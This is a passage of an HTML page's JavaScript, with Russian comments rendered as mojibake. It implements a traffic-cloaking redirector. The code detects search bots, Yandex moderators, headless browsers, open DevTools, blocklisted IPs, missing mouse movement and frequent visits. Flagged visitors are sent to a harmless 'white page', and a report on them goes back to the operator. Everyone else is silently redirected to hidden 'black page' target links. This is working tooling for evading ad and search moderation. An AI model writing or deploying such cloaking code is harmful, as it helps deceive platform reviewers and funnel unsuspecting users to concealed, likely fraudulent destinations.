             } catch (error) { console.warn(`Failed to check Reverse DNS for ${ip}:`, error.name === 'AbortError' ? 'Timeout' : error.message); }
             return false;
         }

        // 6. –ß–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫ IP
        function isIpBlocked(cfg, ip) {
            if (!cfg.checkIpBlocklist || !ip) return null;
            return blockListIPs.has(ip) ? `IP ${ip} –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ` : null;
        }

        // 7. –ú–æ–¥–µ—Ä–∞—Ç–æ—Ä/–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫
        function isLikelyModerator(cfg) {
            if (!cfg.checkModeratorDevTools) return null;
            let reasons = [];
            if (navigator.webdriver) reasons.push('navigator.webdriver=true');
            const widthThreshold = 150; const heightThreshold = 150;
            if ((window.outerWidth - window.innerWidth > widthThreshold) || (window.outerHeight - window.innerHeight > heightThreshold)) {
                reasons.push('–û—Ç–∫—Ä—ã—Ç—ã DevTools (–ø–æ —Ä–∞–∑–º–µ—Ä—É –æ–∫–Ω–∞)');
            }
            if (cfg.checkDevToolsTiming) {
                const start = performance.now(); console.log(''); const end = performance.now();
                if (end - start > 5) reasons.push('–í–æ–∑–º–æ–∂–Ω–æ –æ—Ç–∫—Ä—ã—Ç—ã DevTools (timing attack)');
            }
             if (cfg.checkDevToolsExtensions) {
                 if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__ || window.ReactDevTools) reasons.push('React DevTools');
                 if (window.__REDUX_DEVTOOLS_EXTENSION__ || window.reduxDevToolsExtension) reasons.push('Redux DevTools');
             }
            return reasons.length > 0 ? `–ü–æ–¥–æ–∑—Ä–µ–Ω–∏–µ –Ω–∞ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞/—Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ (${reasons.join(', ')})` : null;
        }

        // 8. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ (—Ç–æ–ª—å–∫–æ –ü–ö)
        let noMouseMoveCheckTriggered = false; // –§–ª–∞–≥, —á—Ç–æ —Ç–∞–π–º–µ—Ä —Å—Ä–∞–±–æ—Ç–∞–ª
        function checkNoMouseMove(cfg) {
             if (!cfg.checkNoMouseMove || isMobile) return null;
             // –í—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ —Ç–∞–π–º–µ—Ä–æ–º!
             if (!hadMouseMovement) {
                 noMouseMoveCheckTriggered = true;
                 return `–ù–µ—Ç –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ ${NO_MOUSE_MOVE_TIMEOUT_DESKTOP / 1000} —Å–µ–∫ (–î–µ—Å–∫—Ç–æ–ø)`;
             }
             return null;
        }

        // 9. –ß–∞—Å—Ç–æ—Ç–∞ –ø–æ—Å–µ—â–µ–Ω–∏–π (—Ç–æ–ª—å–∫–æ –ü–ö)
        function trackVisits() { /* ... –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π ... */
            const now = Date.now(); const windowMillis = VISIT_TRACKING_WINDOW_MINUTES * 60 * 1000;
            let visits = [];
            try { visits = JSON.parse(localStorage.getItem('visits') || '[]'); if (!Array.isArray(visits)) visits = []; }
            catch (e) { console.error("LS visits parse error:", e); visits = []; localStorage.removeItem('visits'); }
            visits = visits.filter(ts => typeof ts === 'number' && now - ts < windowMillis); visits.push(now);
            try {
                localStorage.setItem('visits', JSON.stringify(visits));
                visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1; // –û–±–Ω–æ–≤–ª—è–µ–º –≥–ª–æ–±–∞–ª—å–Ω—ã–π —Å—á–µ—Ç—á–∏–∫
                localStorage.setItem('visitCount', visitCount.toString());
            } catch (e) { console.error("LS write error:", e); }
            return visits.length;
        }
        function isBlockedByFrequency(cfg) {
            if (!cfg.checkFrequency || isMobile) return null; // –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –∏–ª–∏ –Ω–µ –¥–ª—è –ü–ö
            let blockEndTime = 0;
            try { blockEndTime = parseInt(localStorage.getItem('visitBlockEndTime') || '0'); }
            catch (e) { console.error("LS block time read error:", e); }
            if (Date.now() < blockEndTime) {
                const remainingMinutes = Math.ceil((blockEndTime - Date.now()) / (60 * 1000));
                return `–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∑–∞ —á–∞—Å—Ç–æ—Ç—É –ø–æ—Å–µ—â–µ–Ω–∏–π (–æ—Å—Ç–∞–ª–æ—Å—å ${remainingMinutes} –º–∏–Ω)`;
            }
            const visitsInWindow = trackVisits(); // –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –≤–∏–∑–∏—Ç –≤—Å–µ–≥–¥–∞
            if (visitsInWindow > MAX_VISITS_PER_WINDOW) { // –ë–ª–æ–∫–∏—Ä—É–µ–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç
                const blockDurationMillis = VISIT_BLOCK_DURATION_HOURS * 60 * 60 * 1000;
                const newBlockEndTime = Date.now() + blockDurationMillis;
                try { localStorage.setItem('visitBlockEndTime', newBlockEndTime.toString()); }
                catch (e) { console.error("LS block time write error:", e); }
                return `–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç –ø–æ—Å–µ—â–µ–Ω–∏–π (${visitsInWindow}/${MAX_VISITS_PER_WINDOW}) –∑–∞ ${VISIT_TRACKING_WINDOW_MINUTES} –º–∏–Ω. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –Ω–∞ ${VISIT_BLOCK_DURATION_HOURS} —á–∞—Å.`;
            }
            return null; // –ù–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω
        }

        // --- –û–°–ù–û–í–ù–ê–Ø –õ–û–ì–ò–ö–ê ---

        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–µ–ª—å —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
        async function determineRedirectTarget() {
            try {
                // 1. –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω—Ñ–∏–≥ (–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º visitCount)
                const configText = await loadFile(CONFIG_FILE);
                config = parseConfig(configText);
                console.log("Config loaded:", config);
                const activeConfig = isMobile ? config.mobile : config.desktop;

                // 2. –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ: –∑–∞–≥—Ä—É–∂–∞–µ–º –±–ª–æ–∫-–ª–∏—Å—Ç –∏ —Å–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ
                const blockListPromise = activeConfig.checkIpBlocklist ? loadFile(BLOCKLIST_FILE) : Promise.resolve(null);
                const userInfoPromise = collectUserInfo();

                // 3. –î–æ–∂–∏–¥–∞–µ–º—Å—è –∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –±–ª–æ–∫-–ª–∏—Å—Ç
                const blockListText = await blockListPromise;
                if (blockListText) {
                    blockListIPs = new Set(blockListText.split('\n').map(ip => ip.trim()).filter(Boolean));
                    console.log(`Loaded ${blockListIPs.size} IPs from blocklist.`);
                }

                // 4. –î–æ–∂–∏–¥–∞–µ–º—Å—è —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
                userInfo = await userInfoPromise;
                console.log("User info collected:", userInfo);

                // --- 5. –ó–ê–ü–£–°–ö –ü–†–û–í–ï–†–û–ö –ò –°–ë–û–† –ü–†–ò–ß–ò–ù ---
                let triggeredReasons = []; // –ú–∞—Å—Å–∏–≤ –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ—Ö —Å—Ä–∞–±–æ—Ç–∞–≤—à–∏—Ö –ø—Ä–∏—á–∏–Ω

                // –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –≤–∫–ª—é—á–µ–Ω–Ω—ã–µ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏
                const reasonBotTrap = checkBotTrap(activeConfig);
                if (reasonBotTrap) triggeredReasons.push(reasonBotTrap);

                const reasonSearchBot = isSearchBot(activeConfig, userInfo.userAgent);
                if (reasonSearchBot) triggeredReasons.push(reasonSearchBot);

                const reasonHeadless = isHeadlessBrowser(activeConfig);
                if (reasonHeadless) triggeredReasons.push(reasonHeadless);

                // –ü—Ä–æ–≤–µ—Ä–∫–∞ iframe –Ø–Ω–¥–µ–∫—Å–∞ (—Ç–µ–ø–µ—Ä—å —Ç–æ–ª—å–∫–æ iframe)
                const reasonYandexIframe = hasYandexModeratorIframe(activeConfig);
                if (reasonYandexIframe) triggeredReasons.push(reasonYandexIframe);

                const reasonIpBlocked = isIpBlocked(activeConfig, userInfo.ip);
                if (reasonIpBlocked) triggeredReasons.push(reasonIpBlocked);

                const reasonModerator = isLikelyModerator(activeConfig);
                if (reasonModerator) triggeredReasons.push(reasonModerator);

                // –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–∞—Å—Ç–æ—Ç—ã (–≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –≤—Å–µ–≥–¥–∞ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è, –¥–æ–±–∞–≤–ª—è–µ—Ç –ø—Ä–∏—á–∏–Ω—É –µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–∞ –∏ —Å—Ä–∞–±–æ—Ç–∞–ª–∞)
                const reasonFrequency = isBlockedByFrequency(activeConfig);
                if (reasonFrequency && activeConfig.checkFrequency) { // –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–∏—á–∏–Ω—É —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤–∫–ª—é—á–µ–Ω–∞
                     triggeredReasons.push(reasonFrequency);
                } else if (reasonFrequency && !activeConfig.checkFrequency) {
                     console.log(`Frequency check triggered but is disabled: ${reasonFrequency}`); // –õ–æ–≥–∏—Ä—É–µ–º, –Ω–æ –Ω–µ –±–ª–æ–∫–∏—Ä—É–µ–º
                }

                // –í—ã–ø–æ–ª–Ω—è–µ–º –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—É—é —É–≥–ª—É–±–ª–µ–Ω–Ω—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –Ø–Ω–¥–µ–∫—Å–∞, –µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–∞
                if (activeConfig.checkYandexBotDeep) {
                     const reasonYandexBot = await isYandexBot(activeConfig, userInfo);
                     if (reasonYandexBot) triggeredReasons.push(reasonYandexBot);
                }

                // --- 6. –ü–†–ò–ù–Ø–¢–ò–ï –†–ï–®–ï–ù–ò–Ø –ò –î–ï–ô–°–¢–í–ò–Ø ---
                if (triggeredReasons.length > 0) {
                    // –ï—Å—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–Ω–∞ –ø—Ä–∏—á–∏–Ω–∞ –¥–ª—è –∫–ª–æ–∞–∫–∏–Ω–≥–∞
                    cloakedReason = triggeredReasons.join('; '); // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –ø—Ä–∏—á–∏–Ω—ã –≤ –æ–¥–Ω—É —Å—Ç—Ä–æ–∫—É
                    redirectTarget = WHITE_PAGE;
                    console.warn(`Cloaking triggered. Reasons: ${cloakedReason}. Redirecting to WHITE_PAGE.`);
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –û–î–ò–ù –æ—Ç—á–µ—Ç —Å–æ –í–°–ï–ú–ò –ø—Ä–∏—á–∏–Ω–∞–º–∏
                    await sendCloakReport(triggeredReasons, userInfo);
                    // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ WHITE_PAGE
                    setTimeout(performRedirect, REDIRECT_DELAY_FALLBACK);
                } else {
                    // –ü—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ–π–¥–µ–Ω—ã - –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–µ–ª–µ–≤—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
                    console.log("All checks passed. Determining target link...");
                    const code = getUrlParameter('code');
                    if (code) {
                        const linksText = await loadFile(LINKS_FILE);
                        if (linksText) {
                            targetLinks = linksText.split('\n').map(link => link.trim()).filter(Boolean);
                            const index = parseInt(code) - 1;
                            if (targetLinks.length > 0) {
                                if (index >= 0 && index < targetLinks.length) redirectTarget = targetLinks[index];
                                else redirectTarget = targetLinks[Math.floor(Math.random() * targetLinks.length)]; // –°–ª—É—á–∞–π–Ω–∞—è
                                console.log(`Using link from ${LINKS_FILE}: ${redirectTarget}`);
                            } else { redirectTarget = BLACK_PAGE; console.warn(`${LINKS_FILE} empty. Using BLACK_PAGE.`); }
                        } else { redirectTarget = BLACK_PAGE; console.error(`Failed to load ${LINKS_FILE}. Using BLACK_PAGE.`); }
                    } else {
                        redirectTarget = BLACK_PAGE;
                        console.log(`No code parameter. Using default BLACK_PAGE: ${redirectTarget}`);
                    }

                    // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (–º–æ–±–∏–ª—å–Ω—ã–µ) –∏–ª–∏ –∂–¥–µ–º –º—ã—à—å/—Ç–∞–π–º–∞—É—Ç (–¥–µ—Å–∫—Ç–æ–ø)
                    if (isMobile) {
                        redirectTimeoutId = setTimeout(performRedirect, REDIRECT_DELAY_MOBILE);
                        console.log(`Mobile device. Redirecting to ${redirectTarget} in ${REDIRECT_DELAY_MOBILE}ms`);
                    } else {
                        console.log(`Desktop device. Waiting for mouse movement or ${NO_MOUSE_MOVE_TIMEOUT_DESKTOP}ms timeout...`);
                        // –¢–∞–π–º–µ—Ä NoMouseMove –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω –≤ window.onload
                    }
                }

            } catch (error) {
                console.error("Critical error in determineRedirectTarget:", error);
                // –ù–ï –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç –æ–± –æ—à–∏–±–∫–µ
                redirectTarget = WHITE_PAGE; // –ó–∞–ø–∞—Å–Ω–æ–π –≤–∞—Ä–∏–∞–Ω—Ç
                cloakedReason = '–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞';
                setTimeout(performRedirect, REDIRECT_DELAY_FALLBACK);
            }
        }

        // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
        function performRedirect() {
            clearTimeout(redirectTimeoutId);
            clearTimeout(noMouseMoveTimeoutId);
            pageFullyLoaded = true;
            console.log(`Redirecting to: ${redirectTarget}`);
            try { window.location.replace(redirectTarget); }
            catch (e) { console.error("Redirect failed:", e); window.location.href = redirectTarget; }
        }

        // --- –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –°–û–ë–´–¢–ò–ô ---

        // –ö–ª–∏–∫ –ø–æ –ª–æ–≤—É—à–∫–µ
        document.querySelector('.bot-trap-link').addEventListener('click', async (e) => {
            e.preventDefault();
            // –°—Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤–∫–ª—é—á–µ–Ω–∞ –∏ –æ—Ç—á–µ—Ç –µ—â–µ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
            if (config[isMobile ? 'mobile' : 'desktop']?.checkBotTrap && !reportSent) {
                 botTrapActivated = true; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ
                 console.warn('Bot trap activated!');
                 const reason = '–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –ª–æ–≤—É—à–∫–∞ –¥–ª—è –±–æ—Ç–æ–≤ (–∫–ª–∏–∫ –ø–æ —Å–∫—Ä—ã—Ç–æ–π —Å—Å—ã–ª–∫–µ)';
                 cloakedReason = reason; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∏—á–∏–Ω—É
                 redirectTarget = WHITE_PAGE;
                 // –ü–µ—Ä–µ—Å–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç
                 userInfo = await collectUserInfo(); // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ —Å —Ñ–ª–∞–≥–æ–º botTrapActivated=true
                 await sendCloakReport([reason], userInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç —Å —ç—Ç–æ–π –ø—Ä–∏—á–∏–Ω–æ–π
                 performRedirect(); // –ù–µ–º–µ–¥–ª–µ–Ω–Ω—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç
            }
        });

        // –î–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏
        function handleMouseMove() {
            if (!hadMouseMovement) {
                hadMouseMovement = true;
                console.log('Mouse movement detected.');
                const promptElement = document.getElementById('mouse-prompt');
                if (promptElement) promptElement.style.display = 'none';

                // –ï—Å–ª–∏ –º—ã—à—å –ø–æ–¥–≤–∏–Ω—É–ª–∞—Å—å –î–û —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏—è —Ç–∞–π–º–µ—Ä–∞ NoMouseMove
                // –∏ –∫–ª–æ–∞–∫–∏–Ω–≥ –µ—â–µ –ù–ï —Å—Ä–∞–±–æ—Ç–∞–ª –ø–æ –¥—Ä—É–≥–∏–º –ø—Ä–∏—á–∏–Ω–∞–º, –∏ —ç—Ç–æ –¥–µ—Å–∫—Ç–æ–ø
                if (!noMouseMoveCheckTriggered && !cloakedReason && !isMobile) {
                    clearTimeout(noMouseMoveTimeoutId); // –û—Ç–º–µ–Ω—è–µ–º —Ç–∞–π–º–µ—Ä NoMouseMove
                    if (!redirectTimeoutId) { // –ó–∞–ø—É—Å–∫–∞–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ —Ü–µ–ª–µ–≤—É—é, –µ—Å–ª–∏ –µ—â–µ –Ω–µ –∑–∞–ø—É—â–µ–Ω
                        console.log(`Starting redirect timer (${REDIRECT_DELAY_AFTER_MOUSE_MOVE}ms) after mouse move.`);
                        redirectTimeoutId = setTimeout(performRedirect, REDIRECT_DELAY_AFTER_MOUSE_MOVE);
                    }
                }
                // –£–¥–∞–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
                document.removeEventListener('mousemove', handleMouseMove);
                document.removeEventListener('touchstart', handleMouseMove);
            }
        }
        document.addEventListener('mousemove', handleMouseMove);
        document.addEventListener('touchstart', handleMouseMove);

        // --- –ó–ê–ü–£–°–ö ---
        window.onload = async () => {
             // –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω—É—é –ª–æ–≥–∏–∫—É
             await determineRedirectTarget();

             // –ï—Å–ª–∏ —ç—Ç–æ –¥–µ—Å–∫—Ç–æ–ø, –∫–ª–æ–∞–∫–∏–Ω–≥ –µ—â–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ NoMouseMove –≤–∫–ª—é—á–µ–Ω–∞
             // -> –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä NoMouseMove
             // –í–∞–∂–Ω–æ: –¥–µ–ª–∞–µ–º —ç—Ç–æ –ü–û–°–õ–ï determineRedirectTarget, —á—Ç–æ–±—ã –∑–Ω–∞—Ç—å, –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª –ª–∏ –∫–ª–æ–∞–∫–∏–Ω–≥ —É–∂–µ
             if (!isMobile && !cloakedReason && config.desktop?.checkNoMouseMove) {
                 console.log(`Starting NoMouseMove check timer (${NO_MOUSE_MOVE_TIMEOUT_DESKTOP}ms)`);
                 noMouseMoveTimeoutId = setTimeout(async () => {
                     // –¢–∞–π–º–µ—Ä —Å—Ä–∞–±–æ—Ç–∞–ª
                     console.log(`NoMouseMove Timeout ${NO_MOUSE_MOVE_TIMEOUT_DESKTOP}ms expired.`);
                     // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª–æ –ª–∏ –¥–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏ –∑–∞ —ç—Ç–æ –≤—Ä–µ–º—è
                     const reasonNoMouse = checkNoMouseMove(config.desktop); // –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤–µ—Ä–Ω–µ—Ç –ø—Ä–∏—á–∏–Ω—É –∏–ª–∏ null

                     // –ï—Å–ª–∏ –¥–≤–∏–∂–µ–Ω–∏—è –Ω–µ –±—ã–ª–æ –ò –∫–ª–æ–∞–∫–∏–Ω–≥ –µ—â–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª –ø–æ –î–†–£–ì–ò–ú –ø—Ä–∏—á–∏–Ω–∞–º
                     if (reasonNoMouse && !cloakedReason && !reportSent) {
                         cloakedReason = reasonNoMouse; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∏—á–∏–Ω—É
                         redirectTarget = WHITE_PAGE;
                         console.warn(`Cloaking triggered by NoMouseMove timer: ${cloakedReason}`);
                         // –ü–µ—Ä–µ—Å–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç
                         userInfo = await collectUserInfo(); // –û–±–Ω–æ–≤–ª—è–µ–º hadMouseMovement
                         await sendCloakReport([reasonNoMouse], userInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç
                         performRedirect(); // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ WHITE_PAGE
                     } else if (reasonNoMouse) {
                         console.log("NoMouseMove triggered, but cloaking already happened or report sent.");
                     }
                 }, NO_MOUSE_MOVE_TIMEOUT_DESKTOP);
             }
         };

    </script>
</body>
</html>
